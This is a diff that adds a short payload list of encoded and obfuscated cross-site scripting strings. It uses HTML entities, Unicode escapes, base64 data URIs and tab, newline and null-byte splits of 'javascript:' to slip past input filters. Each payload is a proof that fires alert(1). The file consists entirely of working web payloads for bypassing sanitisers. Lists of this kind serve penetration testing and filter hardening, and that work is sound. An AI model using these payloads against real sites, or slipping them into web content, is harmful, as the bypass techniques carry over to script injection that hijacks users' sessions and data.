@@ -1,0 +1,20 @@
+# Encoded & Obfuscated XSS Payloads
+
+# HTML Entities (Decimal & Hex)
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<a href="javascript&#x3A;alert&#x28;1&#x29;">XSS</a>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+# Unicode Escapes
+<script>\u0061lert(1)</script>
+<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
+
+# Base64
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>
+<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+"></object>
+
+# Control Characters / Null Bytes
+<iframe src="java script:alert(1)"></iframe>
+<img src="java&#x0A;script:alert(1)">
+<img src="java&#x0D;script:alert(1)">
+<img src="java&#x09;script:alert(1)">
